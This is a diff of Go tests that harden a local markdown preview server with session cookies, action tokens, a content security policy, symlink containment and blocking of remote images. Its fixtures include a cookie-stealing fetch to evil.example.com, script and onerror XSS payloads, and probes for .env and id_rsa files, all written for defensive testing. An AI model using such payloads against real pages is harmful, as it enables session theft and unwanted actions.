@@ -15,6 +15,7 @@ func raw(t *testing.T, s *server, method, url, host string) *httptest.ResponseRe
 	t.Helper()
 	req := httptest.NewRequest(method, url, nil)
 	req.Host = host
+	req.AddCookie(&http.Cookie{Name: sessionCookie, Value: s.session})
 	recorder := httptest.NewRecorder()
 	s.routes().ServeHTTP(recorder, req)
 	return recorder
@@ -22,16 +23,76 @@ func raw(t *testing.T, s *server, method, url, host string) *httptest.ResponseRe
 
 func TestRejectsForeignHost(t *testing.T) {
 	s := testServer(t, fixture(t), "")
-	for _, url := range []string{"/", "/README.md", "/_tree", "/_events", "/_static/app.css"} {
+	for _, url := range []string{"/", at(s, "README.md"), "/_tree", "/_events", "/_static/app.css"} {
 		if code := raw(t, s, http.MethodGet, url, "mds.example.com").Code; code != http.StatusForbidden {
 			t.Errorf("GET %s with a foreign Host = %d, want 403", url, code)
 		}
 	}
-	if code := raw(t, s, http.MethodGet, "/", "localhost:8080").Code; code != http.StatusOK {
-		t.Errorf("GET / on localhost = %d, want 200", code)
+	if code := raw(t, s, http.MethodGet, at(s, ""), "localhost:8080").Code; code != http.StatusOK {
+		t.Errorf("GET the root page on localhost = %d, want 200", code)
 	}
-	if code := raw(t, s, http.MethodGet, "/", "[::1]:8080").Code; code != http.StatusOK {
-		t.Errorf("GET / on ipv6 loopback = %d, want 200", code)
+	if code := raw(t, s, http.MethodGet, at(s, ""), "[::1]:8080").Code; code != http.StatusOK {
+		t.Errorf("GET the root page on ipv6 loopback = %d, want 200", code)
+	}
+}
+
+func TestNothingIsServedWithoutTheKey(t *testing.T) {
+	s := testServer(t, fixture(t), "")
+	bare := func(method, url string) *httptest.ResponseRecorder {
+		t.Helper()
+		req := httptest.NewRequest(method, url, nil)
+		req.Host = "127.0.0.1:8080"
+		recorder := httptest.NewRecorder()
+		s.routes().ServeHTTP(recorder, req)
+		return recorder
+	}
+	for _, url := range []string{
+		"/", at(s, ""), at(s, "README.md"), "/_tree", "/_events", "/_static/app.css",
+		"/_raw?path=" + at(s, "README.md"),
+	} {
+		answer := bare(http.MethodGet, url)
+		if answer.Code != http.StatusUnauthorized {
+			t.Errorf("GET %s with no key = %d, want 401", url, answer.Code)
+		}
+		if strings.Contains(answer.Body.String(), "Root") || strings.Contains(answer.Body.String(), "docs") {
+			t.Errorf("GET %s leaked content to a caller with no key:\n%s", url, answer.Body)
+		}
+	}
+	if body := bare(http.MethodGet, "/").Body.String(); !strings.Contains(body, `id="unlock"`) {
+		t.Errorf("the locked page should offer a way in:\n%s", body)
+	}
+
+	key := func(value string) *httptest.ResponseRecorder {
+		t.Helper()
+		req := httptest.NewRequest(http.MethodPost, "/_auth", strings.NewReader(value))
+		req.Host = "127.0.0.1:8080"
+		recorder := httptest.NewRecorder()
+		s.routes().ServeHTTP(recorder, req)
+		return recorder
+	}
+	for _, wrong := range []string{"", "nope", strings.Repeat("x", 4096), s.token + "x"} {
+		if code := key(wrong).Code; code != http.StatusForbidden {
+			t.Errorf("POST /_auth with a wrong key = %d, want 403", code)
+		}
+	}
+	answer := key(s.token)
+	if answer.Code != http.StatusNoContent {
+		t.Fatalf("POST /_auth with the right key = %d, want 204", answer.Code)
+	}
+	cookies := (&http.Response{Header: answer.Header()}).Cookies()
+	if len(cookies) != 1 || cookies[0].Value != s.session {
+		t.Fatalf("cookies = %+v, want a session of its own", cookies)
+	}
+	// cookies are not scoped by port, so anything else on localhost may come to hold this
+	// one; it must not be the master key
+	if cookies[0].Value == s.token {
+		t.Error("the cookie carries the master key, so leaking it to another localhost port hands over everything")
+	}
+	if !cookies[0].HttpOnly || cookies[0].SameSite != http.SameSiteStrictMode || cookies[0].Path != "/" {
+		t.Errorf("cookie = %+v, want it HttpOnly, SameSite=Strict and scoped to /", cookies[0])
+	}
+	if code, _ := get(t, s, at(s, "README.md")); code != http.StatusOK {
+		t.Errorf("GET with the cookie = %d, want 200", code)
 	}
 }
 
@@ -43,12 +104,23 @@ func TestStateChangingEndpointsNeedTheToken(t *testing.T) {
 	s.launch = func(string) error { t.Error("/_edit ran without a token"); return nil }
 	s.addRoot(plan, false)
 
+	// the cookie alone is not enough: a page has to echo the value its own markup carries
 	for _, url := range []string{
-		"/_add?path=" + dir, "/_drop?root=_r1", "/_stop", "/_edit?path=README.md",
+		"/_add?path=" + dir, "/_drop?root=" + s.roots[1].prefix, "/_stop", "/_edit?path=" + at(s, "README.md"),
 	} {
 		if code := raw(t, s, http.MethodPost, url, "127.0.0.1:8080").Code; code != http.StatusForbidden {
-			t.Errorf("POST %s without a token = %d, want 403", url, code)
+			t.Errorf("POST %s without the header = %d, want 403", url, code)
 		}
+	}
+	// and mounting a new path is not something a page may ask for at all
+	mount := httptest.NewRequest(http.MethodPost, "/_add?path="+dir, nil)
+	mount.Host = "127.0.0.1:8080"
+	mount.AddCookie(&http.Cookie{Name: sessionCookie, Value: s.session})
+	mount.Header.Set(tokenHeader, s.action)
+	recorded := httptest.NewRecorder()
+	s.routes().ServeHTTP(recorded, mount)
+	if recorded.Code != http.StatusForbidden {
+		t.Errorf("POST /_add from the page = %d, want 403: only mds itself mounts paths", recorded.Code)
 	}
 	if len(s.roots) != 2 {
 		t.Errorf("roots = %d, want an untokened /_add and /_drop to have changed nothing", len(s.roots))
@@ -57,8 +129,42 @@ func TestStateChangingEndpointsNeedTheToken(t *testing.T) {
 	req.Host, req.Header = "127.0.0.1:8080", http.Header{tokenHeader: {"wrong-token"}}
 	recorder := httptest.NewRecorder()
 	s.routes().ServeHTTP(recorder, req)
-	if recorder.Code != http.StatusForbidden {
-		t.Errorf("POST /_stop with a wrong token = %d, want 403", recorder.Code)
+	if recorder.Code != http.StatusUnauthorized {
+		t.Errorf("POST /_stop with a wrong token = %d, want 401", recorder.Code)
+	}
+}
+
+func TestPagesCarryNoMasterKey(t *testing.T) {
+	s := testServer(t, fixture(t), "")
+	for _, url := range []string{at(s, "README.md"), at(s, "missing.md"), "/"} {
+		if _, body := get(t, s, url); strings.Contains(body, s.token) {
+			t.Errorf("GET %s puts the master key in the markup, where a stylesheet in a hostile document could read it", url)
+		}
+	}
+	if _, body := get(t, s, at(s, "README.md")); !strings.Contains(body, s.action) {
+		t.Error("the page carries nothing to act with, so the editor and stop buttons cannot work")
+	}
+}
+
+func TestRemoteImagesAreOffByDefault(t *testing.T) {
+	s := testServer(t, fixture(t), "")
+	policy := func() string {
+		return request(t, s, http.MethodGet, at(s, "README.md")).Header().Get("Content-Security-Policy")
+	}
+	if got := policy(); !strings.Contains(got, "img-src 'self' data:") {
+		t.Errorf("csp = %q, want remote images refused: an <img> in someone else's file is a beacon", got)
+	}
+	for _, off := range []string{"", "0", "false", "no", "please"} {
+		t.Setenv(remoteEnv, off)
+		if got := policy(); !strings.Contains(got, "img-src 'self' data:") {
+			t.Errorf("csp with %s=%q = %q, want anything but a plain yes to leave them blocked", remoteEnv, off, got)
+		}
+	}
+	for _, on := range []string{"1", "true", "TRUE"} {
+		t.Setenv(remoteEnv, on)
+		if got := policy(); !strings.Contains(got, "img-src * data:") {
+			t.Errorf("csp with %s=%q = %q, want remote images allowed back", remoteEnv, on, got)
+		}
 	}
 }
 
@@ -71,10 +177,10 @@ func TestServesOnlyMarkdownAndImages(t *testing.T) {
 	writeFile(t, dir, "steal.js", "fetch('//evil.example.com?c=' + document.cookie)\n")
 	s := testServer(t, dir, "")
 
-	if status, body := get(t, s, "/logo.png"); status != http.StatusOK || !strings.Contains(body, "PNG") {
+	if status, body := get(t, s, at(s, "logo.png")); status != http.StatusOK || !strings.Contains(body, "PNG") {
 		t.Errorf("GET /logo.png = %d, want the image markdown refers to", status)
 	}
-	for _, name := range []string{"/.env", "/id_rsa", "/steal.js", "/notes.txt"} {
+	for _, name := range []string{at(s, ".env"), at(s, "id_rsa"), at(s, "steal.js"), at(s, "notes.txt")} {
 		status, body := get(t, s, name)
 		if status != http.StatusNotFound {
 			t.Errorf("GET %s = %d, want 404: only markdown and images are served", name, status)
@@ -106,7 +212,7 @@ func TestSymlinkCannotEscapeTheRoot(t *testing.T) {
 	escapingLink(t, dir, "escape", outside)
 	s := testServer(t, dir, "")
 
-	for _, url := range []string{"/notes.md", "/logo.png", "/escape/id_rsa"} {
+	for _, url := range []string{at(s, "notes.md"), at(s, "logo.png"), at(s, "escape/id_rsa"), "/_raw?path=" + at(s, "notes.md")} {
 		status, body := get(t, s, url)
 		if strings.Contains(body, "PRIVATE KEY") {
 			t.Errorf("GET %s followed a symlink out of the root", url)
@@ -119,7 +225,7 @@ func TestSymlinkCannotEscapeTheRoot(t *testing.T) {
 	if err := os.Symlink("real.md", filepath.Join(dir, "alias.md")); err != nil {
 		t.Fatal(err)
 	}
-	if status, body := get(t, s, "/alias.md"); status != http.StatusOK || !strings.Contains(body, "Real") {
+	if status, body := get(t, s, at(s, "alias.md")); status != http.StatusOK || !strings.Contains(body, "Real") {
 		t.Errorf("GET /alias.md = %d, want a symlink inside the root to still resolve", status)
 	}
 }
@@ -152,7 +258,7 @@ func TestSymlinkSwappedUnderTrafficCannotEscape(t *testing.T) {
 					return
 				default:
 				}
-				if _, body := get(t, s, "/notes.md"); strings.Contains(body, "PRIVATE KEY") {
+				if _, body := get(t, s, at(s, "notes.md")); strings.Contains(body, "PRIVATE KEY") {
 					leaked.Add(1)
 				}
 			}
@@ -163,11 +269,11 @@ func TestSymlinkSwappedUnderTrafficCannotEscape(t *testing.T) {
 	served := 0
 	for range rounds {
 		relink(t, link, escape)
-		if _, body := get(t, s, "/notes.md"); strings.Contains(body, "PRIVATE KEY") {
+		if _, body := get(t, s, at(s, "notes.md")); strings.Contains(body, "PRIVATE KEY") {
 			leaked.Add(1)
 		}
 		relink(t, link, "real.md")
-		if status, body := get(t, s, "/notes.md"); status == http.StatusOK && strings.Contains(body, "Real") {
+		if status, body := get(t, s, at(s, "notes.md")); status == http.StatusOK && strings.Contains(body, "Real") {
 			served++
 		}
 	}
@@ -197,7 +303,7 @@ func TestScriptsInMarkdownCannotRun(t *testing.T) {
 	writeFile(t, dir, "evil.md", "# Hi\n\n<script>fetch('/_add?path=/',{method:'POST'})</script>\n"+
 		"<img src=x onerror=\"fetch('/_stop',{method:'POST'})\">\n<details><summary>ok</summary>body</details>\n")
 	s := testServer(t, dir, "")
-	recorder := request(t, s, http.MethodGet, "/evil.md")
+	recorder := request(t, s, http.MethodGet, at(s, "evil.md"))
 	body, policy := recorder.Body.String(), recorder.Header().Get("Content-Security-Policy")
 
 	scripts := ""
@@ -231,7 +337,7 @@ func TestResponsesDenyCrossOriginReads(t *testing.T) {
 	writeFile(t, dir, "README.md", "# Root\n")
 	writeFile(t, dir, "logo.png", "\x89PNG\n")
 	s := testServer(t, dir, "")
-	for _, url := range []string{"/README.md", "/logo.png", "/_static/app.js", "/_tree"} {
+	for _, url := range []string{at(s, "README.md"), at(s, "logo.png"), "/_static/app.js", "/_tree"} {
 		recorder := request(t, s, http.MethodGet, url)
 		if got := recorder.Header().Get("Cross-Origin-Resource-Policy"); got != "same-origin" {
 			t.Errorf("GET %s CORP = %q, want same-origin", url, got)
